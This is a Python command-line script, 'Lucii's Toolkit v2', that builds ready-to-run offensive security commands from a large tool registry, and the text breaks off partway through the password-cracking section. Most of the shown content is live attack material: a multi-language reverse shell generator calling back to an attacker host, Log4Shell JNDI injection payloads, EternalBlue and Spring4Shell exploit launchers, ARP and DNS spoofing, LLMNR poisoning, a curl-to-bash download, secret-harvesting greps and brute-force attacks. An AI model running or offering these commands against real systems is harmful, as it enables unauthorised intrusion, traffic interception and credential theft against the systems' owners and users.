#!/usr/bin/env python3
"""
LUCII'S TOOLKIT v2 — Maximum Upgrade
Run: python3 lucii_upgraded.py
Requires: pip install rich pyperclip
"""

import sys, os, readline, subprocess, json, time, threading, signal
from datetime import datetime
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.syntax import Syntax
from rich.prompt import Prompt
from rich.rule import Rule
from rich.align import Align
from rich.columns import Columns
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.live import Live
from rich import box

console = Console()

SESSION_LOG = Path.home() / ".lucii_session.log"
FAVORITES_FILE = Path.home() / ".lucii_favorites.json"
HISTORY_FILE = Path.home() / ".lucii_history"

# ─── PALETTE ─────────────────────────────────────────────────────────────────
C = {
    "recon":       "#00ff9d",
    "web":         "#ff4d6d",
    "privesc":     "#ffd60a",
    "network":     "#7b5ea7",
    "exploit":     "#ff6b35",
    "passwords":   "#00b4d8",
    "ad":          "#e040fb",
    "persist":     "#06d6a0",
    "log":         "#f77f00",
    "forensics":   "#90e0ef",
    "phishing":    "#ff006e",
    "mobile":      "#8338ec",
    "crypto":      "#3a86ff",
    "cloud":       "#fb5607",
    "malware":     "#ff0054",
    "c2":          "#ff3cac",
    "wireless":    "#17c3b2",
    "container":   "#00b4d8",
    "evasion":     "#f72585",
    "osint":       "#4cc9f0",
    "ransomware":  "#ef233c",
}

RY = "/usr/share/wordlists/rockyou.txt"
DB = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

# ─── FAVORITES & HISTORY ─────────────────────────────────────────────────────
def load_favorites():
    if FAVORITES_FILE.exists():
        try:
            return set(json.loads(FAVORITES_FILE.read_text()))
        except Exception:
            return set()
    return set()

def save_favorites(favs):
    FAVORITES_FILE.write_text(json.dumps(list(favs)))

FAVORITES = load_favorites()

def fav_key(cat, tool_id):
    return f"{cat}:{tool_id}"

def log_session(cat, tool_name, cmd):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(SESSION_LOG, "a") as f:
        f.write(f"\n[{ts}] [{cat.upper()}] {tool_name}\n{cmd}\n{'─'*60}\n")

def export_all_commands(tools_dict):
    out = Path.home() / "lucii_commands_export.txt"
    with open(out, "w") as f:
        f.write("LUCII'S TOOLKIT — All Commands Export\n")
        f.write(f"Generated: {datetime.now()}\n\n")
        for cat_key, cat in tools_dict.items():
            f.write(f"\n{'═'*60}\n{cat['label']}\n{'═'*60}\n")
            for t in cat["tools"]:
                f.write(f"\n# {t['name']} — {t['desc']}\n")
                try:
                    defaults = [d for _, _, d in t.get("fields", [])]
                    cmd = t["cmd"](defaults)
                    f.write(cmd + "\n")
                except Exception:
                    f.write("# (parameterized — run in toolkit)\n")
    console.print(f"\n  [bold #00ff9d]exported → {out}[/]\n")
    input("  enter to continue ")

def copy_to_clipboard(text):
    try:
        import pyperclip
        pyperclip.copy(text)
        return True
    except Exception:
        try:
            subprocess.run(["xclip", "-selection", "clipboard"], input=text.encode(), check=True)
            return True
        except Exception:
            try:
                subprocess.run(["xsel", "--clipboard", "--input"], input=text.encode(), check=True)
                return True
            except Exception:
                return False

# ─── TOOL REGISTRY ───────────────────────────────────────────────────────────
TOOLS = {

    # ══════════════════════════════════════════════════════════════════════════
    "recon": { "label": "RECON & OSINT", "tools": [
        { "id":"1",  "name":"NMAP Full",           "desc":"Version, scripts, OS, all 65535 ports",
          "fields":[("t","Target IP/CIDR","192.168.1.1")],
          "cmd": lambda f: f"nmap -sV -sC -O -p- --min-rate 5000 -oN nmap_full.txt {f[0]}" },
        { "id":"2",  "name":"NMAP Vuln Scan",      "desc":"Run vuln NSE scripts against target",
          "fields":[("t","Target","192.168.1.1")],
          "cmd": lambda f: f"nmap --script vuln -sV {f[0]} -oN nmap_vuln.txt" },
        { "id":"3",  "name":"NMAP UDP",             "desc":"Top 200 UDP port scan",
          "fields":[("t","Target","192.168.1.1")],
          "cmd": lambda f: f"nmap -sU --top-ports 200 {f[0]} -oN nmap_udp.txt" },
        { "id":"4",  "name":"NMAP NSE Custom",      "desc":"Run specific NSE scripts",
          "fields":[("t","Target","192.168.1.1"),("s","Script(s)","http-enum,http-headers")],
          "cmd": lambda f: f"nmap --script {f[1]} -sV {f[0]} -oN nmap_custom.txt" },
        { "id":"5",  "name":"Gobuster Dir",         "desc":"Directory + file bruteforce",
          "fields":[("t","Target URL","10.10.10.1"),("th","Threads","50")],
          "cmd": lambda f: f"gobuster dir -u http://{f[0]} -w {DB} -x php,html,txt,bak,zip,json,conf -t {f[1]} -o gobuster.txt" },
        { "id":"6",  "name":"Gobuster DNS",         "desc":"Subdomain bruteforce via DNS",
          "fields":[("d","Domain","target.com"),("w","Wordlist","/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")],
          "cmd": lambda f: f"gobuster dns -d {f[0]} -w {f[1]} -o gobuster_dns.txt" },
        { "id":"7",  "name":"FFUF Dirs",            "desc":"Fast web fuzzer — directories",
          "fields":[("u","URL","http://10.10.10.1/FUZZ"),("w","Wordlist",DB)],
          "cmd": lambda f: f"ffuf -u {f[0]} -w {f[1]} -mc 200,301,302,403 -t 100 -o ffuf.json" },
        { "id":"8",  "name":"FFUF VHost",           "desc":"Virtual host discovery",
          "fields":[("u","Base URL","http://target.com"),("d","Domain","target.com"),("w","Wordlist","/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")],
          "cmd": lambda f: f"ffuf -u {f[0]} -H 'Host: FUZZ.{f[1]}' -w {f[2]} -mc 200,301,302 -o vhost.json" },
        { "id":"9",  "name":"Sublist3r",            "desc":"Subdomain enumeration via OSINT",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"python3 /opt/Sublist3r/sublist3r.py -d {f[0]} -o subdomains.txt" },
        { "id":"10", "name":"Amass",                "desc":"Deep subdomain + ASN mapping",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"amass enum -passive -d {f[0]} -o amass.txt" },
        { "id":"11", "name":"theHarvester",         "desc":"OSINT — emails, hosts, IPs, names",
          "fields":[("d","Domain","target.com"),("s","Sources","google,bing,linkedin,twitter")],
          "cmd": lambda f: f"theHarvester -d {f[0]} -l 500 -b {f[1]}" },
        { "id":"12", "name":"Shodan CLI",           "desc":"Search exposed hosts on Shodan",
          "fields":[("q","Query","apache country:GB port:80")],
          "cmd": lambda f: f'shodan search --fields ip_str,port,org,country_name "{f[0]}"' },
        { "id":"13", "name":"WhatWeb",              "desc":"Web stack fingerprinting",
          "fields":[("u","URL","https://target.com")],
          "cmd": lambda f: f"whatweb -v -a 3 {f[0]}" },
        { "id":"14", "name":"Enum4linux",           "desc":"SMB/Windows enumeration",
          "fields":[("t","Target IP","192.168.1.10")],
          "cmd": lambda f: f"enum4linux -a {f[0]} 2>&1 | tee enum4linux.txt" },
        { "id":"15", "name":"DNSrecon",             "desc":"DNS zone walk, brute, std enum",
          "fields":[("d","Domain","target.com"),("t","Type","std")],
          "cmd": lambda f: f"dnsrecon -d {f[0]} -t {f[1]}" },
        { "id":"16", "name":"Masscan",              "desc":"Internet-scale port scanner",
          "fields":[("t","Target/CIDR","192.168.1.0/24"),("p","Ports","1-65535"),("r","Rate","10000")],
          "cmd": lambda f: f"masscan {f[0]} -p{f[1]} --rate={f[2]} -oG masscan.txt" },
        { "id":"17", "name":"Wayback URLs",         "desc":"Pull archived URLs from Wayback Machine",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f'curl -s "http://web.archive.org/cdx/search/cdx?url=*.{f[0]}/*&output=text&fl=original&collapse=urlkey" | sort -u | tee wayback.txt' },
        { "id":"18", "name":"GAU",                  "desc":"Fetch known URLs from AlienVault + Wayback",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"gau {f[0]} | tee gau_urls.txt" },
        { "id":"19", "name":"CRT.sh Cert Search",  "desc":"Find subdomains via certificate transparency",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f'curl -s "https://crt.sh/?q=%.{f[0]}&output=json" | python3 -c "import sys,json;[print(x[\'name_value\']) for x in json.load(sys.stdin)]" | sort -u' },
        { "id":"20", "name":"Shodan Exploit",       "desc":"Search Shodan for specific CVE/exploit",
          "fields":[("q","CVE or term","CVE-2021-44228")],
          "cmd": lambda f: f'shodan search "{f[0]}" --fields ip_str,port,org,product | head -50' },
        { "id":"21", "name":"Censys Search",        "desc":"Censys.io host/cert enumeration",
          "fields":[("q","Query","target.com"),("k","API ID",""),("s","Secret","")],
          "cmd": lambda f: f'curl -s --user "{f[1]}:{f[2]}" "https://search.censys.io/api/v2/hosts/search?q={f[0]}&per_page=25" | python3 -m json.tool' },
        { "id":"22", "name":"GitHub Dork",          "desc":"Search GitHub for leaked secrets",
          "fields":[("q","Dork","org:target password OR api_key OR secret")],
          "cmd": lambda f: f'gh search code "{f[0]}" --json path,repository | python3 -m json.tool' },
        { "id":"23", "name":"Google Dork Helper",   "desc":"Generate common Google dorks for target",
          "fields":[("d","Domain","target.com")],
          "cmd": lambda f: f"""echo '=== Google Dorks for {f[0]} ==='
echo 'site:{f[0]} filetype:pdf'
echo 'site:{f[0]} filetype:xlsx OR filetype:csv'
echo 'site:{f[0]} inurl:admin OR inurl:login OR inurl:panel'
echo 'site:{f[0]} intext:password OR intext:api_key OR intext:secret'
echo '"@{f[0]}" filetype:txt'
echo 'site:pastebin.com "{f[0]}"'
echo 'site:github.com "{f[0]}" password'""" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "web": { "label": "WEB ATTACK", "tools": [
        { "id":"1",  "name":"SQLMap Auto",          "desc":"Full automated SQL injection",
          "fields":[("u","Target URL","http://target.com/page?id=1"),("d","DB (opt)","")],
          "cmd": lambda f: f'sqlmap -u "{f[0]}" --dbs --batch --level=5 --risk=3 --random-agent --dump-all --threads=5' + (f" -D {f[1]}" if f[1] else "") },
        { "id":"2",  "name":"SQLMap POST",          "desc":"SQLi on POST request body",
          "fields":[("u","URL","http://target.com/login"),("d","POST data","user=admin&pass=test")],
          "cmd": lambda f: f'sqlmap -u "{f[0]}" --data="{f[1]}" --batch --level=5 --risk=3 --random-agent --dbs' },
        { "id":"3",  "name":"XSStrike",             "desc":"Advanced XSS scanner + crawler",
          "fields":[("u","URL","http://target.com/search?q=")],
          "cmd": lambda f: f'python3 /opt/XSStrike/xsstrike.py -u "{f[0]}" --crawl --blind' },
        { "id":"4",  "name":"Nikto",                "desc":"Web server vulnerability scan",
          "fields":[("t","Host/URL","http://target.com")],
          "cmd": lambda f: f"nikto -h {f[0]} -o nikto_report.txt -Format txt" },
        { "id":"5",  "name":"WPScan",               "desc":"WordPress vulnerability scanner",
          "fields":[("u","WordPress URL","http://wp-site.com"),("k","API Token (opt)","")],
          "cmd": lambda f: f"wpscan --url {f[0]} --enumerate u,p,t,tt --plugins-detection aggressive" + (f" --api-token {f[1]}" if f[1] else "") },
        { "id":"6",  "name":"Commix",               "desc":"Command injection exploiter",
          "fields":[("u","URL","http://target.com/cmd?ip=127.0.0.1")],
          "cmd": lambda f: f'python3 /opt/commix/commix.py --url="{f[0]}" --batch' },
        { "id":"7",  "name":"SSRF Probe",           "desc":"Server-Side Request Forgery tester",
          "fields":[("u","URL","http://target.com/fetch?url="),("cb","Callback host","your-burp-collab.net")],
          "cmd": lambda f: f'curl -s "{f[0]}http://{f[1]}/test"' },
        { "id":"8",  "name":"LFI Scanner",          "desc":"Local File Inclusion path traversal",
          "fields":[("u","URL","http://target.com/page?file=")],
          "cmd": lambda f: f'for p in "../../etc/passwd" "../../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2fetc%2fpasswd"; do echo "--- $p ---"; curl -s "{f[0]}$p" | grep root; done' },
        { "id":"9",  "name":"XXE Payload",          "desc":"Generate XML External Entity payload",
          "fields":[("f","File to read","/etc/passwd"),("cb","Callback (opt)","attacker.com")],
          "cmd": lambda f: f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file://{f[0]}">]><root>&xxe;</root>' },
        { "id":"10", "name":"CORS Tester",          "desc":"Test CORS misconfiguration",
          "fields":[("u","URL","https://api.target.com/data"),("o","Origin","https://evil.com")],
          "cmd": lambda f: f'curl -s -I -H "Origin: {f[1]}" -X GET "{f[0]}" | grep -i "access-control"' },
        { "id":"11", "name":"JWT Crack",            "desc":"Crack JWT secret with hashcat",
          "fields":[("jwt","JWT Token","eyJ...")],
          "cmd": lambda f: f'echo "{f[0]}" > jwt.txt\nhashcat -a 0 -m 16500 jwt.txt {RY}' },
        { "id":"12", "name":"Parameter Miner",      "desc":"Discover hidden GET/POST parameters",
          "fields":[("u","URL","http://target.com/page"),("w","Wordlist","/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt")],
          "cmd": lambda f: f'ffuf -u "{f[0]}?FUZZ=test" -w {f[1]} -mc 200,301,302 -fw 1 -o params.json' },
        { "id":"13", "name":"HTTP Request Smuggling","desc":"Test for HTTP/1.1 request smuggling",
          "fields":[("u","URL","http://target.com")],
          "cmd": lambda f: f"python3 smuggler.py -u {f[0]}" },
        { "id":"14", "name":"Open Redirect Test",   "desc":"Test for open redirect vulnerabilities",
          "fields":[("u","URL","http://target.com/redirect?url=")],
          "cmd": lambda f: f'for p in "https://evil.com" "//evil.com" "/\\evil.com" "%0d%0ahttps://evil.com"; do echo "--- $p ---"; curl -sI "{f[0]}$p" | grep -i location; done' },
        { "id":"15", "name":"Directory Traversal",  "desc":"Path traversal wordlist fuzz",
          "fields":[("u","Base URL","http://target.com/download?file=")],
          "cmd": lambda f: f'ffuf -u "{f[0]}FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -o traversal.json' },
        { "id":"16", "name":"GraphQL Introspect",   "desc":"Dump full GraphQL schema",
          "fields":[("u","GraphQL endpoint","http://target.com/graphql")],
          "cmd": lambda f: f"""curl -s -X POST "{f[0]}" -H "Content-Type: application/json" -d '{{"query":"{{__schema{{types{{name fields{{name type{{name kind ofType{{name kind}}}}}}}}}}}}"}}' | python3 -m json.tool""" },
        { "id":"17", "name":"WebSocket Fuzzer",     "desc":"Connect and fuzz a WebSocket endpoint",
          "fields":[("u","WS URL","ws://target.com/ws"),("p","Payload","{{\"cmd\":\"FUZZ\"}}")],
          "cmd": lambda f: f'websocat {f[0]} --text -n1 <<< \'{f[1]}\'' },
        { "id":"18", "name":"OAuth Token Steal",    "desc":"Test OAuth redirect_uri bypass",
          "fields":[("u","Auth URL","https://target.com/oauth/authorize"),("ci","client_id","abc123"),("r","Your redirect","https://evil.com")],
          "cmd": lambda f: f'echo "Test URLs:"\necho "{f[0]}?response_type=token&client_id={f[1]}&redirect_uri={f[2]}"\necho "{f[0]}?response_type=token&client_id={f[1]}&redirect_uri={f[2]}%2F"' },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "privesc": { "label": "PRIVESC", "tools": [
        { "id":"1",  "name":"LinPEAS",              "desc":"Full Linux privesc auditor",
          "fields":[],
          "cmd": lambda f: "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>&1 | tee linpeas.txt" },
        { "id":"2",  "name":"SUID/GUID Find",       "desc":"Find SUID and GUID binaries",
          "fields":[],
          "cmd": lambda f: "echo '=== SUID ==='; find / -perm -4000 -type f 2>/dev/null; echo '=== GUID ==='; find / -perm -2000 -type f 2>/dev/null" },
        { "id":"3",  "name":"Sudo Check",           "desc":"List sudo rights",
          "fields":[],
          "cmd": lambda f: "sudo -l 2>/dev/null" },
        { "id":"4",  "name":"Capabilities",         "desc":"Find dangerous capability binaries",
          "fields":[],
          "cmd": lambda f: "getcap -r / 2>/dev/null" },
        { "id":"5",  "name":"Cron Jobs",            "desc":"Find writable/interesting cron jobs",
          "fields":[],
          "cmd": lambda f: "crontab -l 2>/dev/null; cat /etc/cron* /etc/crontab /var/spool/cron/crontabs/* 2>/dev/null" },
        { "id":"6",  "name":"pspy",                 "desc":"Monitor processes without root",
          "fields":[("i","Interval ms","1000")],
          "cmd": lambda f: f"./pspy64 -pf -i {f[0]}" },
        { "id":"7",  "name":"Kernel CVE Search",    "desc":"Match kernel to known exploits",
          "fields":[],
          "cmd": lambda f: 'uname -a; searchsploit "$(uname -r | cut -d- -f1)" linux kernel' },
        { "id":"8",  "name":"Docker Escape",        "desc":"Detect container escape vectors",
          "fields":[],
          "cmd": lambda f: "cat /proc/1/cgroup | head -5; ls -la /var/run/docker.sock 2>/dev/null; capsh --print 2>/dev/null; mount | grep docker" },
        { "id":"9",  "name":"PATH Hijack",          "desc":"Find writable directories in PATH",
          "fields":[],
          "cmd": lambda f: "echo $PATH | tr ':' '\\n' | xargs -I{} find {} -writable -type f 2>/dev/null" },
        { "id":"10", "name":"NFS Shares",           "desc":"Check for no_root_squash NFS mounts",
          "fields":[],
          "cmd": lambda f: "cat /etc/exports 2>/dev/null; showmount -e localhost 2>/dev/null" },
        { "id":"11", "name":"World Writable",       "desc":"Find world-writable files",
          "fields":[],
          "cmd": lambda f: "find / -perm -0002 -type f 2>/dev/null | grep -v proc" },
        { "id":"12", "name":"GTFOBins Check",       "desc":"Check sudo/SUID against GTFOBins list",
          "fields":[("b","Binary name","vim")],
          "cmd": lambda f: f'curl -s "https://gtfobins.github.io/gtfobins/{f[0]}/" | grep -i "sudo\\|suid\\|shell" | head -20' },
        { "id":"13", "name":"LXD/LXC Escape",      "desc":"Container escape via LXD group",
          "fields":[],
          "cmd": lambda f: "id; groups; lxc image list 2>/dev/null; lxc list 2>/dev/null" },
        { "id":"14", "name":"Passwd Writable",      "desc":"Check if /etc/passwd is writable",
          "fields":[],
          "cmd": lambda f: 'ls -la /etc/passwd; ls -la /etc/shadow; if [ -w /etc/passwd ]; then echo "[!] /etc/passwd is writable!"; fi' },
        { "id":"15", "name":"Env Variables",        "desc":"Dump environment & interesting vars",
          "fields":[],
          "cmd": lambda f: "env; echo '---'; cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | sort -u | grep -iE 'pass|key|secret|token|api'" },
        { "id":"16", "name":"Writable Systemd",     "desc":"Find writable systemd unit files",
          "fields":[],
          "cmd": lambda f: "find /etc/systemd /usr/lib/systemd -writable -type f 2>/dev/null" },
        { "id":"17", "name":"Python Library Hijack","desc":"Find writable Python site-packages",
          "fields":[],
          "cmd": lambda f: "python3 -c 'import sys; print(sys.path)'; find / -name '*.py' -writable 2>/dev/null | grep -v proc | head -20" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "network": { "label": "NETWORK & MITM", "tools": [
        { "id":"1",  "name":"tcpdump Capture",      "desc":"Packet capture to .pcap",
          "fields":[("i","Interface","eth0"),("f","BPF Filter (opt)","port 80")],
          "cmd": lambda f: "tcpdump -i {} -w capture.pcap{} -n -v".format(f[0], " '{}'".format(f[1]) if f[1] else "") },
        { "id":"2",  "name":"ARP Spoof MITM",       "desc":"Man-in-the-middle via ARP poison",
          "fields":[("i","Interface","eth0"),("v","Victim IP","192.168.1.50"),("g","Gateway IP","192.168.1.1")],
          "cmd": lambda f: f"echo 1 > /proc/sys/net/ipv4/ip_forward; arpspoof -i {f[0]} -t {f[1]} {f[2]} & arpspoof -i {f[0]} -t {f[2]} {f[1]}" },
        { "id":"3",  "name":"Chisel Tunnel",        "desc":"TCP tunnel over HTTP (pivot)",
          "fields":[("m","Mode (server/client)","client"),("p","Port","8080"),("r","Server host","10.10.14.1"),("fp","Forward port","3306")],
          "cmd": lambda f: (f"./chisel server -p {f[1]} --reverse" if f[0]=="server" else f"./chisel client {f[2]}:{f[1]} R:{f[3]}:127.0.0.1:{f[3]}") },
        { "id":"4",  "name":"SSH Tunnel",           "desc":"Local/remote SSH port forward",
          "fields":[("t","Type (local/remote)","local"),("lp","Local port","8080"),("rh","Remote target","127.0.0.1"),("rp","Remote port","80"),("u","SSH user@host","user@target")],
          "cmd": lambda f: (f"ssh -L {f[1]}:{f[2]}:{f[3]} {f[4]}" if f[0]=="local" else f"ssh -R {f[3]}:{f[2]}:{f[1]} {f[4]}") },
        { "id":"5",  "name":"ProxyChains",          "desc":"Route tools through SOCKS5 proxy",
          "fields":[("c","Command","nmap -sT -Pn 10.0.0.1")],
          "cmd": lambda f: f"proxychains4 -f /etc/proxychains4.conf {f[0]}" },
        { "id":"6",  "name":"Netcat Listener",      "desc":"Raw TCP listener",
          "fields":[("p","Port","4444")],
          "cmd": lambda f: f"rlwrap nc -nlvp {f[0]}" },
        { "id":"7",  "name":"Socat Relay",          "desc":"TCP relay/pivot with socat",
          "fields":[("lp","Listen port","4444"),("rh","Remote host","10.0.0.5"),("rp","Remote port","80")],
          "cmd": lambda f: f"socat TCP-LISTEN:{f[0]},fork TCP:{f[1]}:{f[2]}" },
        { "id":"8",  "name":"Responder LLMNR",      "desc":"Poison LLMNR/NBT-NS for hashes",
          "fields":[("i","Interface","eth0")],
          "cmd": lambda f: f"responder -I {f[0]} -rdwv" },
        { "id":"9",  "name":"Mitm6 IPv6",           "desc":"IPv6 MITM + DNS takeover",
          "fields":[("d","Domain","corp.local"),("i","Interface","eth0")],
          "cmd": lambda f: f"mitm6 -d {f[0]} -i {f[1]}" },
        { "id":"10", "name":"Bettercap",            "desc":"Launch full bettercap MITM suite",
          "fields":[("i","Interface","eth0")],
          "cmd": lambda f: f"bettercap -iface {f[0]}" },
        { "id":"11", "name":"VLAN Hop",             "desc":"802.1Q double-tag VLAN hopping",
          "fields":[("i","Interface","eth0"),("v1","Native VLAN","1"),("v2","Target VLAN","20"),("t","Target IP","10.20.0.1")],
          "cmd": lambda f: f"modprobe 8021q; vconfig add {f[0]} {f[1]}; vconfig add {f[0]}.{f[1]} {f[2]}; ifconfig {f[0]}.{f[1]}.{f[2]} up" },
        { "id":"12", "name":"DNS Spoof",            "desc":"Spoof DNS responses on LAN",
          "fields":[("i","Interface","eth0"),("d","Domain to spoof","target.com"),("ip","Redirect IP","192.168.1.100")],
          "cmd": lambda f: f"echo '{f[2]} {f[1]}' >> /etc/hosts; bettercap -iface {f[0]} -eval 'dns.spoof on'" },
        { "id":"13", "name":"Packet Injection",     "desc":"Craft + inject raw packets with scapy",
          "fields":[("t","Target IP","192.168.1.1"),("p","Port","80")],
          "cmd": lambda f: f'python3 -c "from scapy.all import *; send(IP(dst=\\"{f[0]}\\")/TCP(dport={f[1]},flags=\\"S\\"),count=10)"' },
        { "id":"14", "name":"SOCKS5 Proxy Setup",   "desc":"SSH dynamic SOCKS5 tunnel",
          "fields":[("u","SSH user@host","user@pivot"),("p","Local SOCKS port","1080")],
          "cmd": lambda f: f"ssh -D {f[1]} -f -C -q -N {f[0]}\n# Then: export ALL_PROXY=socks5://127.0.0.1:{f[1]}" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "exploit": { "label": "EXPLOIT", "tools": [
        { "id":"1",  "name":"MSF Multi/Handler",    "desc":"Metasploit catch-all listener",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("pl","Payload","linux/x64/meterpreter/reverse_tcp")],
          "cmd": lambda f: f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {f[2]}; set LHOST {f[0]}; set LPORT {f[1]}; exploit -j"' },
        { "id":"2",  "name":"Rev Shell Gen",        "desc":"bash/python/nc/php/perl/ruby/powershell",
          "fields":[("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("t","Type (bash/python3/nc/php/perl/ruby/powershell)","bash")],
          "cmd": lambda f: {
              "bash":       f"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1",
              "python3":    f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{f[0]}\",{f[1]}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
              "nc":         f"nc -e /bin/bash {f[0]} {f[1]}",
              "php":        f"php -r '$sock=fsockopen(\"{f[0]}\",{f[1]});$proc=proc_open(\"/bin/bash\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
              "perl":       f"perl -e 'use Socket;$i=\"{f[0]}\";$p={f[1]};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
              "ruby":       f"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{f[0]}\",{f[1]}))'",
              "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{f[0]}',{f[1]});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}}\""
          }.get(f[2], f"bash -i >& /dev/tcp/{f[0]}/{f[1]} 0>&1") },
        { "id":"3",  "name":"msfvenom Payload",     "desc":"Generate shellcode / executables",
          "fields":[("pl","Payload","linux/x64/meterpreter/reverse_tcp"),("lh","LHOST","10.10.14.1"),("lp","LPORT","4444"),("f","Format","elf"),("o","Output","shell.elf")],
          "cmd": lambda f: f"msfvenom -p {f[0]} LHOST={f[1]} LPORT={f[2]} -f {f[3]} -o {f[4]} && chmod +x {f[4]}" },
        { "id":"4",  "name":"SearchSploit",         "desc":"Search ExploitDB offline",
          "fields":[("q","Search term","vsftpd 2.3.4")],
          "cmd": lambda f: f'searchsploit "{f[0]}"' },
        { "id":"5",  "name":"TTY Upgrade",          "desc":"Upgrade dumb shell to full PTY",
          "fields":[],
          "cmd": lambda f: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z → stty raw -echo → fg\nexport TERM=xterm" },
        { "id":"6",  "name":"Buffer Overflow",      "desc":"Generate BOF pattern + offset",
          "fields":[("l","Pattern length","500")],
          "cmd": lambda f: f'python3 -c "import cyclic; print(cyclic.cyclic({f[0]}))"\n# or with msf: msf-pattern_create -l {f[0]}' },
        { "id":"7",  "name":"Ret2Libc",             "desc":"Find libc base + system/binsh offsets",
          "fields":[("b","Binary","./vuln"),("lp","libc path","/lib/x86_64-linux-gnu/libc.so.6")],
          "cmd": lambda f: f"ldd {f[0]} | grep libc\npython3 -c \"from pwn import *; l=ELF('{f[1]}'); print(hex(l.symbols['system'])); print(hex(next(l.search(b'/bin/sh'))))\"" },
        { "id":"8",  "name":"ROP Gadget Finder",    "desc":"Find ROP gadgets in binary",
          "fields":[("b","Binary","./vuln")],
          "cmd": lambda f: f"ROPgadget --binary {f[0]} --rop | head -50" },
        { "id":"9",  "name":"File Transfer (HTTP)", "desc":"Python HTTP server for file transfer",
          "fields":[("p","Port","8000")],
          "cmd": lambda f: f"python3 -m http.server {f[0]}" },
        { "id":"10", "name":"EternalBlue (MS17-010)","desc":"SMB exploit for unpatched Windows",
          "fields":[("t","Target IP","10.0.0.5"),("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {f[0]}; set LHOST {f[1]}; set LPORT {f[2]}; run"' },
        { "id":"11", "name":"Log4Shell (CVE-2021-44228)","desc":"JNDI injection log4j exploit",
          "fields":[("lh","LDAP/Callback host","10.10.14.1"),("lp","LDAP port","1389"),("p","HTTP port","8888")],
          "cmd": lambda f: f"""# Start JNDI exploit server
python3 /opt/JNDIExploit/JNDIExploit.py -i {f[0]}
# Payload to inject in vulnerable header:
echo '${{jndi:ldap://{f[0]}:{f[1]}/exploit}}'
# Test with curl:
curl -H 'X-Api-Version: ${{jndi:ldap://{f[0]}:{f[1]}/exploit}}' http://target.com""" },
        { "id":"12", "name":"Spring4Shell",         "desc":"CVE-2022-22965 Spring RCE",
          "fields":[("t","Target URL","http://target.com/"),("lh","LHOST","10.10.14.1"),("lp","LPORT","4444")],
          "cmd": lambda f: f"python3 /opt/Spring4Shell-POC/exploit.py --url {f[0]} --lhost {f[1]} --lport {f[2]}" },
    ]},

    # ══════════════════════════════════════════════════════════════════════════
    "passwords": { "label": "CREDS & HASHES", "tools": [
        { "id":"1",  "name":"Hashcat",              "desc":"GPU hash cracking",
          "fields":[("h","Hash/File","hash.txt"),("w","Wordlist",RY),("m","Mode","0")],
          "cmd": lambda f: f'hashcat -m {f[2]} -a 0 "{f[0]}" {f[1]} --show' },
        { "id":"2",  "name":"Hashcat Rules",        "desc":"Hashcat with best64 rules",
          "fields":[("h","Hash/File","hash.txt"),("w","Wordlist",RY),("m","Mode","0")],
          "cmd": lambda f: f'hashcat -m {f[2]} -a 0 "{f[0]}" {f[1]} -r /usr/share/hashcat/rules/best64.rule' },
        { "id":"3",  "name":"Hashcat Mask",         "desc":"Mask attack (brute pattern)",
          "fields":[("h","Hash/File","hash.txt"),("m","Mode","0"),("mk","Mask","?u?l?l?l?d?d?d?d")],
          "cmd": lambda f: f'hashcat -m {f[1]} -a 3 "{f[0]}" "{f[2]}"' },
        { "id":"4",  "name":"John the Ripper",      "desc":"Crack hashes / shadow files",
          "fields":[("f","Hash file","/etc/shadow"),("w","Wordlist",RY)],
          "cmd": lambda f: f"john {f[0]} --wordlist={f[1]} --format=auto; john {f[0]} --show" },
        { "id":"5",  "name":"Hydra SSH",            "desc":"SSH brute force",
          "fields":[("t","Target IP","192.168.1.10"),("u","Username","admin"),("p","Password list",RY)],
          "cmd": lambda f: f"hydra -l {f[1]} -P {f[2]} {f[0]} ssh -t 4 -V" },
        { "id":"6",  "name":"Hydra HTTP",           "desc":"HTTP POST form brute force",
